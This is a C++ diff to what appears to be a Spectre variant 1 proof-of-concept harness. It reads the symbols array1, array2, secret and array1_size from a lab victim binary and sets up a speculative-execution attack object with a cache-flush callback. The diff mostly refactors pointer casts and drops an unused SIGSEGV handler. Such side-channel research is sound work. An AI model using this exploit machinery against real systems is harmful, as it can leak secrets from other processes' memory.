@@ -3,24 +3,11 @@
 //
 #include <stdafx.h>
 #include <cacheutils.h>
-#include <lilelf.h>
 #include <Spectrev1.h>
-
-#include <sys/mman.h>
-#include <signal.h>
-
-void handle_sigsegv(int signum, siginfo_t* si, void* vcontext)
-{
-    reinterpret_cast<ucontext_t*>(vcontext)->uc_mcontext.gregs[REG_RIP]++;
-}
+#include <lilelf.h>
 
 int main()
 {
-    // install sigsegv handler
-    struct sigaction action{};
-    action.sa_flags = SA_SIGINFO;
-    action.sa_sigaction = handle_sigsegv;
-//    sigaction(SIGSEGV, &action, NULL);
 
     auto victim = LilElf("./Spec1Victim");
 
@@ -30,11 +17,11 @@ int main()
     auto sym_array2 =victim.get_sym("array2");
     auto sym_array1 = victim.get_sym("array1");
 
-    auto m_array1_size = victim.get_sym_value(sym_array1_size);
-    uint8_t* m_secret = reinterpret_cast<uint8_t*>(victim.get_static_sym_value(sym_secret));
+    auto m_array1_size = victim.get_sym_value<void*>(sym_array1_size);
+    uint8_t* m_secret = victim.get_static_sym_value<uint8_t>(sym_secret);
 
-    Spectrev1 s(reinterpret_cast<uint8_t*>(victim.get_sym_value(sym_array1)),
-                reinterpret_cast<uint8_t*>(victim.get_sym_value(sym_array2)),
+    Spectrev1 s(victim.get_sym_value<void*>(sym_array1),
+                victim.get_sym_value<void*>(sym_array2),
                 [&](volatile size_t x){flush(m_array1_size);  ;;},
                 [](size_t _t){return _t%16;},
                 512,
